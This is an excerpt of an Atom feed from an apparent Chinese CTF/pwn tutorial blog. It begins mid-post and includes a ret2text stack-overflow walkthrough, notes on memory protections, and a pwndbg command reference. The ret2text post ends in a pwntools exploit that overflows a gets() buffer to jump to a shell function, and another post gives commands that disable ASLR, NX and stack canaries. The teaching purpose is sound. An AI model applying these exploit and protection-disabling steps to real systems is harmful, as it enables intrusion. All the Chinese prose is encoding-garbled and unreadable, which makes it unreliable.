class="number">0xffffd0fc</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>â”‚      <span class="number">0xffffd108</span> â€”â–¸ <span class="number">0xf7ffd000</span> â—‚â€” and    al, <span class="number">0xbf</span> <span class="comment">/* 0x2bf24 */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>câ”‚ eax  <span class="number">0xffffd10c</span> â—‚â€” <span class="string">&#x27;aaaa&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202213719919.png" alt="image-20221202213719919"></p><p>è®¡ç®—ç›¸å¯¹åç§»åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p 0x88 - 0x1c</span><br><span class="line">$1 = 108</span><br></pre></td></tr></table></figure><p><strong>å¯ä»¥å¾—å‡ºgdbåŠ¨æ€åˆ†æå’Œidaé™æ€åˆ†æç»“æœä¸åŒï¼Œsä¸ebpè·ç¦»ä¸åŒ</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ret2shellcode&quot;&gt;&lt;a href=&quot;#ret2shellcode&quot; class=&quot;headerlink&quot; title=&quot;ret2shellcode&quot;&gt;&lt;/a&gt;ret2shellcode&lt;/h2&gt;&lt;p&gt;åœ¨æ ˆæº¢å‡ºçš„æ”»å‡»æŠ€æœ¯ä¸­é€šå¸¸æ˜¯è¦æ§åˆ¶å‡½æ•°çš„è¿”å›åœ°å€åˆ°è‡ªå·±</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>è¶…ç®€å•çš„Stack Overflow</title>
    <link href="https://pwnling.github.io/2022/12/02/4-ret2text/"/>
    <id>https://pwnling.github.io/2022/12/02/4-ret2text/</id>
    <published>2022-12-02T09:00:00.000Z</published>
    <updated>2022-12-02T09:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è¶…ç®€å•çš„Stack-Overflow"><a href="#è¶…ç®€å•çš„Stack-Overflow" class="headerlink" title="è¶…ç®€å•çš„Stack Overflow"></a>è¶…ç®€å•çš„Stack Overflow</h1><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åç¼–è¯‘ä¼ªä»£ç </span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you heard of buffer overflow?&quot;</span>);</span><br><span class="line">  vulnerable(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It seems that you know nothing about it ......&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŒå‡»vulnerableï¼Œè¿›å…¥vulnerableå‡½æ•°ï¼Œå‘ç°gets()ï¼Œè°ƒè¯•æ—¶å¯ä»¥åœ¨æ­¤è¾“å…¥æ•°æ®</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±[ebp-10h]å¯ä»¥çŸ¥é“æ­¤å¤„è·ç¦»ebpä¸º0x10ä¸ªå­—èŠ‚ï¼Œåé¢ç”¨gdbè°ƒè¯•è¯´æ˜</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è°ƒè¯•ä¸‰è¿</span></span><br><span class="line">gdb ter2text</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202154009111.png" alt="image-20221202154009111"></p><p><strong>[ REGISTERS ]è¯´æ˜</strong></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œ EBP å’Œ ESP çš„åœ°å€éƒ½å¾ˆé«˜ï¼Œè¿™ä¹Ÿè¯´æ˜æ ˆå­˜æ”¾åœ¨å†…å­˜çš„é«˜åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EBP  0xffffd168 â—‚â€” 0x0</span><br><span class="line">ESP  0xffffd160 â€”â–¸ 0xffffd180 â—‚â€” 0x1</span><br></pre></td></tr></table></figure><p><strong>[ DISASM ]è¯´æ˜</strong></p><p>è¿™é‡Œåªæ˜¯æ˜¾ç¤ºäº†mainå‡½æ•°ä¸­çš„å‰å‡ è¡Œæ±‡ç¼–ä»£ç </p><p><strong>[ STACK ]è¯´æ˜</strong></p><p>GDBä¸­ä»¥ä½åœ°å€åˆ°é«˜åœ°å€æ˜¾ç¤ºï¼Œä¸å®é™…ç›¸å</p><h6 id=""><a href="#" class="headerlink" title="#"></a>#</h6><p>æ²¡æœ‰å‘ç°åœ¨IDAé‡Œé¢æœ‰ä»·å€¼çš„vulnerable( )ï¼Œç”¨ n ä¸æ–­å‘ä¸‹æ‰§è¡Œï¼Œç›´åˆ°æŒ‡å‘vulnerable( )åœ°å€</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202161428044.png" alt="image-20221202161428044"></p><p>æ¥ç€ç”¨ s æ­¥å…¥å‡½æ•°å†…éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä»mainå˜æˆäº†vulnerableï¼Œè¯´æ˜æ­¥å…¥å‡½æ•°ä½“æˆåŠŸ</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202161556272.png" alt="image-20221202161556272"></p><p>æ¥ç€æˆ‘ä»¬ç”¨ n ç»§ç»­è¿è¡Œï¼Œæç¤ºæˆ‘ä»¬è¦è¾“å…¥æ•°æ®ï¼Œæˆ‘ä»¬è¿™é‡Œè¾“å…¥ä¸è¶…è¿‡12ä¸ªå­—èŠ‚çš„æ•°æ®<strong>ï¼ˆidaé‡Œé¢æ˜¾ç¤ºvulnerableå‡½æ•°å®šä¹‰äº†æ•°ç»„ä¸ºchar s[12]ï¼‰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">aaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>å†ç”¨stack 20 æŸ¥çœ‹æ ˆå…·ä½“æƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®å·²ç»å¡«å……äº†è¿›å»ã€‚æ­¤æ—¶ebpçš„åœ°å€ä¸º0xffffd158ï¼Œé‡Œé¢å­˜æ”¾åŸå…ˆebpçš„åœ°å€0xffffd168ï¼Œebpçš„ä¸‹ä¸€æ¡åœ°å€æ˜¯0xffffd15c é‡Œé¢å­˜æ”¾ç€è¿”å›ä¸»å‡½æ•°çš„åœ°å€0x80485ae <strong>(main+93)</strong><br><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202162604717.png" alt="image-20221202162604717"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†ç™½è‰²éƒ¨åˆ†åŒºåŸŸè¦†ç›–ï¼Œå³å¡«å……æ•°æ®åˆ°ebpçš„é•¿åº¦ä¸ºï¼ˆ0x18 - 0x8 = 16å­—èŠ‚ï¼‰ï¼›<br>å†å°†ebpä¸­çš„å€¼0x80485ae <strong>(main+93)</strong>ï¼ˆå³ç²‰çº¢æ¡†ï¼‰ä¹Ÿè¦†ç›–æ‰ï¼ˆ4ä¸ªå­—èŠ‚ï¼‰ï¼›<br>å†åŠ ä¸Šæˆ‘ä»¬çš„back_doorå‡½æ•°åœ°å€ï¼Œå°±å¯ä»¥è·å¾—shell</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202165837052.png" alt="image-20221202165837052"></p><p>é‚£ä¹ˆæˆ‘ä»¬è¦è¿”å›çš„åé—¨åœ°å€æ˜¯ä»€ä¹ˆå‘¢ï¼ŸidaæŸ¥çœ‹æœ‰ä¸ªget_shellå‡½æ•°ï¼Œç‚¹å‡»æ‰“å¼€ï¼Œå†é¼ æ ‡å³é”®copy to assembly</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202171159198.png" alt="image-20221202171159198"></p><p>å¾—åˆ°è¿”å›åœ°å€0x8048522</p><p><img src="https://cdn.staticaly.com/gh/PWNLing/blogbed@master/stack/image-20221202171351903.png" alt="image-20221202171351903"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x8048522</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è¶…ç®€å•çš„Stack-Overflow&quot;&gt;&lt;a href=&quot;#è¶…ç®€å•çš„Stack-Overflow&quot; class=&quot;headerlink&quot; title=&quot;è¶…ç®€å•çš„Stack Overflow&quot;&gt;&lt;/a&gt;è¶…ç®€å•çš„Stack Overflow&lt;/h1&gt;&lt;h2 id=&quot;I</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>ä¿æŠ¤æœºåˆ¶å’Œç¼–è¯‘</title>
    <link href="https://pwnling.github.io/2022/12/02/1-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E7%BC%96%E8%AF%91/"/>
    <id>https://pwnling.github.io/2022/12/02/1-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E7%BC%96%E8%AF%91/</id>
    <published>2022-12-02T05:00:00.000Z</published>
    <updated>2022-12-02T05:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å†…å­˜ä¿æŠ¤æœºåˆ¶"><a href="#å†…å­˜ä¿æŠ¤æœºåˆ¶" class="headerlink" title="å†…å­˜ä¿æŠ¤æœºåˆ¶"></a>å†…å­˜ä¿æŠ¤æœºåˆ¶</h1><h2 id="ASLR-Address-Space-Layout-Randomization"><a href="#ASLR-Address-Space-Layout-Randomization" class="headerlink" title="ASLR (Address Space Layout Randomization)"></a>ASLR (Address Space Layout Randomization)</h2><p><strong>éšæœºåŒ–æ ˆä¸Šçš„åœ°å€</strong></p><p>â€¢/proc/sys/kernel/randomize_va_space = 0ï¼šæ²¡æœ‰éšæœºåŒ–ã€‚å³å…³é—­ ASLR</p><p>â€¢/proc/sys/kernel/randomize_va_space = 1ï¼šä¿ç•™çš„éšæœºåŒ–ã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–</p><p>â€¢/proc/sys/kernel/randomize_va_space = 2ï¼šå®Œå…¨çš„éšæœºåŒ–ã€‚åœ¨randomize_va_space = 1çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡ brk() åˆ†é…çš„å†…å­˜ç©ºé—´ä¹Ÿå°†è¢«éšæœºåŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨Ubuntuä¸Šè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œå¯ä»¥å‘ç°ç³»ç»Ÿå¼€å¯äº†ASLR</span></span><br><span class="line">ROP$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h2 id="PIE-Position-Independent-Executable"><a href="#PIE-Position-Independent-Executable" class="headerlink" title="PIE (Position-Independent Executable)"></a>PIE (Position-Independent Executable)</h2><p><strong>â€¢éšæœºåŒ–ELFæ–‡ä»¶çš„æ˜ å°„åœ°å€ï¼ˆéšæœºåŒ–bssã€dataã€textæ®µåœ°å€ï¼‰</strong></p><p><strong>â€¢å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆ</strong></p><h2 id="The-NX-bits-the-No-eXecute-bits"><a href="#The-NX-bits-the-No-eXecute-bits" class="headerlink" title="The NX bits (the No-eXecute bits)"></a>The NX bits (the No-eXecute bits)</h2><p>â€¢é€šè¿‡åœ¨å†…å­˜é¡µçš„æ ‡è¯†ä¸­å¢åŠ â€œæ‰§è¡Œâ€ä½, å¯ä»¥è¡¨ç¤ºè¯¥å†…å­˜é¡µæ˜¯å¦å¯ä»¥æ‰§è¡Œ, è‹¥ç¨‹åºä»£ç çš„ EIP æ‰§è¡Œè‡³ä¸å¯è¿è¡Œçš„å†…å­˜é¡µ, åˆ™ CPU å°†ç›´æ¥æ‹’ç»æ‰§è¡Œâ€œæŒ‡ä»¤â€é€ æˆç¨‹åºå´©æºƒ</p><h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p>â€¢åœ¨åˆšè¿›å…¥å‡½æ•°æ—¶ï¼Œåœ¨æ ˆä¸Šæ”¾ç½®ä¸€ä¸ªæ ‡å¿—canaryï¼Œåœ¨å‡½æ•°è¿”å›æ—¶æ£€æµ‹å…¶æ˜¯å¦è¢«æ”¹å˜ã€‚ä»¥è¾¾åˆ°é˜²æŠ¤æ ˆæº¢å‡ºçš„ç›®çš„</p><p>â€¢canary<strong>é•¿åº¦ä¸º1å­—é•¿</strong>ï¼Œå…¶ä½ç½®ä¸ä¸€å®šä¸ebp/rbpå­˜å‚¨çš„ä½ç½®ç›¸é‚»ï¼Œå…·ä½“å¾—çœ‹ç¨‹åºçš„æ±‡ç¼–æ“ä½œ</p><h2 id="RELRO-RELocate-Read-Only"><a href="#RELRO-RELocate-Read-Only" class="headerlink" title="RELRO (RELocate Read-Only)"></a>RELRO (RELocate Read-Only)</h2><p>â€¢éƒ¨åˆ† RELRO: åœ¨ç¨‹åºè£…å…¥å, å°†å…¶ä¸­ä¸€äº›æ®µ(å¦‚.dynamic)æ ‡è®°ä¸ºåªè¯», é˜²æ­¢ç¨‹åºçš„ä¸€äº›é‡å®šä½ä¿¡æ¯è¢«ä¿®æ”¹</p><p>â€¢å®Œå…¨ RELRO: åœ¨éƒ¨åˆ† RELRO çš„åŸºç¡€ä¸Š, åœ¨ç¨‹åºè£…å…¥æ—¶, ç›´æ¥è§£æå®Œæ‰€æœ‰ç¬¦å·å¹¶å¡«å…¥å¯¹åº”çš„å€¼, æ­¤æ—¶æ‰€æœ‰çš„ GOT è¡¨é¡¹éƒ½å·²åˆå§‹åŒ–, ä¸”ä¸è£…å…¥link_mapä¸_dl_runtime_resolveçš„åœ°å€</p><h1 id="ç¼–è¯‘pwné¢˜"><a href="#ç¼–è¯‘pwné¢˜" class="headerlink" title="ç¼–è¯‘pwné¢˜"></a>ç¼–è¯‘pwné¢˜</h1><p>gccçš„ç¼–è¯‘å…³äºç¨‹åºä¿æŠ¤å¼€å¯çš„é€‰é¡¹ï¼š<a href="http://t.csdn.cn/3nNkP">http://t.csdn.cn/3nNkP</a></p><p>åŠ äº†<code>-m32</code>å‚æ•°çš„äºŒè¿›åˆ¶å°±æ˜¯32ä½çš„ï¼Œè€Œæ²¡åŠ è¿™ä¸ªå‚æ•°çš„å°±æ˜¯é»˜è®¤çš„64ä½çš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASLRï¼š<span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">NXï¼š-z execstack / -z noexecstack (å…³é—­ / å¼€å¯)</span><br><span class="line">Canaryï¼š-fno-stack-protector /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯)</span><br><span class="line">PIEï¼š-no-pie / -pie (å…³é—­ / å¼€å¯)</span><br><span class="line">RELROï¼š-z norelro / -z lazy / -z now (å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯)</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ç¼–è¯‘Pwné¢˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ç¼–è¯‘32bitï¼šgcc -m32 -fno-stack-protector -z execstack -o pwn1 pwn1.c</span><br><span class="line"></span><br><span class="line">-m32æ„æ€æ˜¯ç¼–è¯‘ä¸º32ä½çš„ç¨‹åº</span><br><span class="line">-fno-stack-protectorå’Œ-z execstackè¿™ä¸¤ä¸ªå‚æ•°ä¼šåˆ†åˆ«å…³æ‰DEPå’ŒStack Protector</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ç¼–è¯‘64bitï¼šgcc -fno-stack-protector -z execstack -o pwn1 pwn1.c</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å†…å­˜ä¿æŠ¤æœºåˆ¶&quot;&gt;&lt;a href=&quot;#å†…å­˜ä¿æŠ¤æœºåˆ¶&quot; class=&quot;headerlink&quot; title=&quot;å†…å­˜ä¿æŠ¤æœºåˆ¶&quot;&gt;&lt;/a&gt;å†…å­˜ä¿æŠ¤æœºåˆ¶&lt;/h1&gt;&lt;h2 id=&quot;ASLR-Address-Space-Layout-Randomization&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>pwndbgè°ƒè¯•</title>
    <link href="https://pwnling.github.io/2022/12/02/2-pwndbg/"/>
    <id>https://pwnling.github.io/2022/12/02/2-pwndbg/</id>
    <published>2022-12-02T05:00:00.000Z</published>
    <updated>2022-12-02T05:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwndbgè°ƒè¯•"><a href="#pwndbgè°ƒè¯•" class="headerlink" title="pwndbgè°ƒè¯•"></a>pwndbgè°ƒè¯•</h1><h2 id="1-b-xx"><a href="#1-b-xx" class="headerlink" title="1.b xx"></a>1.b xx</h2><p> è®¾ç½®æ–­ç‚¹ï¼ˆbæ˜¯breakpointçš„ç¼©å†™ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b å‡½æ•°å        <span class="comment"># åœ¨æŒ‡å®šå‡½æ•°çš„èµ·å§‹å¤„è®¾ç½®æ–­ç‚¹</span></span><br><span class="line">b *åœ°å€  </span><br><span class="line">b è¡Œå·</span><br></pre></td></tr></table></figure><h2 id="2-r"><a href="#2-r" class="headerlink" title="2.r"></a>2.r</h2><p> è¿è¡Œçš„æ„æ€ï¼ˆræ˜¯runçš„ç¼©å†™ï¼‰ï¼Œä¸€èˆ¬ç”¨æ¥ä»£ç å¼€å§‹è¿è¡Œï¼Œæˆ–è€…é‡æ–°è¿è¡Œï¼ˆå¦‚æœè°ƒè¯•åˆ°ä¸€åŠåˆæƒ³ä»å¤´å¼€å§‹è¿è¡Œï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nï¼ˆä¸ä¼šè¿›å…¥å‡½æ•°å†…éƒ¨ï¼‰</span><br><span class="line">sï¼ˆä¼šæ‰§è¡Œåˆ°å‡½æ•°å†…éƒ¨ï¼‰</span><br><span class="line">c</span><br><span class="line">start(æ— æ–­ç‚¹æ—¶)</span><br></pre></td></tr></table></figure><p><strong>c</strong>ï¼šç»§ç»­æ‰§è¡Œï¼ˆcæ˜¯continueçš„ç¼©å†™ï¼‰ï¼Œå½“æ‰§è¡Œrè¿è¡Œåˆ°æŸä¸ªæ–­ç‚¹åï¼Œåé¢æƒ³ç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹æˆ–è€…æŠŠå‰©ä¸‹ä»£ç æ‰§è¡Œå®Œæ¯•ï¼Œå°±å¯ä»¥ä½¿ç”¨c<br><strong>n</strong>ï¼šnextçš„æ„æ€ï¼Œæ‰§è¡Œå½“å‰è¡Œä»£ç  <strong>(å½“å‰è¡Œæ˜¯æŒ‡æºç¨‹åºé‡Œçš„ä¸€è¡Œä»£ç ï¼Œå°±ç›¸å½“äºæ±‡ç¼–çš„å¤šæ¡æŒ‡ä»¤)</strong><br><strong>s</strong>ï¼šstepçš„æ„æ€ï¼Œå½“ä¸€è¡Œä»£ç é‡Œæœ‰å‡½æ•°è°ƒç”¨ï¼Œé‚£ä¹ˆæ‰§è¡Œsä¼šè·³å…¥å‡½æ•°é‡Œæ‰§è¡Œï¼Œå¦‚æœæ²¡æœ‰å‡½æ•°è°ƒç”¨ï¼Œé‚£ä¹ˆæ•ˆæœå’Œnç›¸åŒã€‚çœ‹åˆ°æœ‰æƒ³è¦æ§åˆ¶çš„å‡½æ•°æ—¶ï¼Œå°±ç”¨sï¼Œæ¯”å¦‚ret2textä¸­çš„<strong>vulnerableå‡½æ•°</strong>ï¼Œè¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå†ç”¨nè¿è¡Œä»£ç ï¼Œè¾“å…¥æ•°æ®è°ƒè¯•ã€‚</p><h2 id="3-info-xx"><a href="#3-info-xx" class="headerlink" title="3.info xx"></a>3.info xx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">info b <span class="comment">#æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯ï¼ˆcopyï¼‰</span></span><br><span class="line"></span><br><span class="line">info locals<span class="comment">#æŸ¥çœ‹å±€éƒ¨å˜é‡ï¼ˆcopyï¼‰</span></span><br><span class="line"></span><br><span class="line">info register<span class="comment">#æŸ¥çœ‹å¯„å­˜å™¨ï¼ˆregisterå¯ä»¥ç®€å†™ä¸ºrï¼‰</span></span><br><span class="line">ä¾‹å¦‚ï¼šinfo r ebp <span class="comment">#rä¸èƒ½å»æ‰</span></span><br><span class="line"></span><br><span class="line">info <span class="built_in">functions</span>  <span class="comment">#æŸ¥çœ‹æ‰€æœ‰çš„å‡½æ•°ï¼ˆcopyï¼‰</span></span><br></pre></td></tr></table></figure><h2 id="4-p-xx"><a href="#4-p-xx" class="headerlink" title="4.p xx"></a>4.p xx</h2><p>  pæ˜¯printçš„ç¼©å†™ï¼Œæ‰“å°æŸä¸ªå˜é‡çš„å€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pÂ system/mainÂ <span class="comment">#æ˜¾ç¤ºæŸä¸ªå‡½æ•°åœ°å€</span></span><br><span class="line"></span><br><span class="line">pÂ <span class="variable">$esp</span>Â <span class="comment">#æ˜¾ç¤ºå¯„å­˜å™¨ï¼Œ$ä¸èƒ½å»æ‰</span></span><br><span class="line"></span><br><span class="line">pÂ 0xffÂ -Â 0xeaÂ <span class="comment">#è®¡ç®—å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>Â &amp;VarNameÂ <span class="comment">#æŸ¥çœ‹å˜é‡åœ°å€</span></span><br><span class="line"></span><br><span class="line">pÂ *Â 0xffffebacÂ <span class="comment">#æŸ¥çœ‹æŸä¸ªåœ°å€å¤„çš„å€¼</span></span><br></pre></td></tr></table></figure><h2 id="5-x"><a href="#5-x" class="headerlink" title="5.x/ "></a>5.<strong>x/<n/f/u> <addr></strong></h2><p>å¯ä»¥ä½¿ç”¨examineå‘½ä»¤ï¼ˆç®€å†™æ˜¯xï¼‰æ¥æŸ¥çœ‹å†…å­˜åœ°å€ä¸­çš„å€¼ã€‚xå‘½ä»¤çš„è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>nã€fã€uæ˜¯å¯é€‰çš„å‚æ•°ã€‚</p><p><strong>n</strong> <strong>æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œè¡¨ç¤ºæ˜¾ç¤ºå†…å­˜çš„é•¿åº¦ã€‚</strong>ä¹Ÿå°±æ˜¯è¯´ä»å½“å‰åœ°å€å‘åæ˜¾ç¤ºå‡ ä¸ªåœ°å€çš„å†…å®¹ã€‚</p><p><strong>f</strong> <strong>è¡¨ç¤ºæ˜¾ç¤ºçš„æ ¼å¼ã€‚</strong>å¦‚æœåœ°å€æ‰€æŒ‡çš„æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯<strong>s</strong>ï¼Œå¦‚æœæ˜¯æŒ‡ä»¤åœ°å€ï¼Œé‚£ä¹ˆæ ¼å¼å¯ä»¥æ˜¯iã€‚<br>x æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>d æŒ‰åè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>u æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºæ— ç¬¦å·æ•´å‹ã€‚<br>o æŒ‰å…«è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>t æŒ‰äºŒè¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>a æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>c æŒ‰å­—ç¬¦æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚<br>f æŒ‰æµ®ç‚¹æ•°æ ¼å¼æ˜¾ç¤ºå˜é‡ã€‚</p><p><strong>uè¡¨ç¤ºä»å½“å‰åœ°å€å¾€åè¯·æ±‚çš„å­—èŠ‚æ•°ã€‚</strong>å¦‚æœä¸æŒ‡å®šçš„è¯ï¼ŒGDBé»˜è®¤æ˜¯4ä¸ªbytesã€‚uå‚æ•°å¯ä»¥ç”¨ä¸‹é¢çš„å­—ç¬¦æ¥ä»£æ›¿ï¼Œbè¡¨ç¤ºå•å­—èŠ‚ï¼Œhè¡¨ç¤ºåŒå­—èŠ‚ï¼Œwè¡¨ç¤ºå››å­—èŠ‚ï¼Œgè¡¨ç¤ºå…«å­—èŠ‚ã€‚å½“æˆ‘ä»¬æŒ‡å®šäº†å­—èŠ‚é•¿åº¦åï¼ŒGDBä¼šä»æŒ‡å†…å­˜å®šçš„å†…å­˜åœ°å€å¼€å§‹ï¼Œè¯»å†™æŒ‡å®šå­—èŠ‚ï¼Œå¹¶æŠŠå…¶å½“ä½œä¸€ä¸ªå€¼å–å‡ºæ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10xb &amp;len 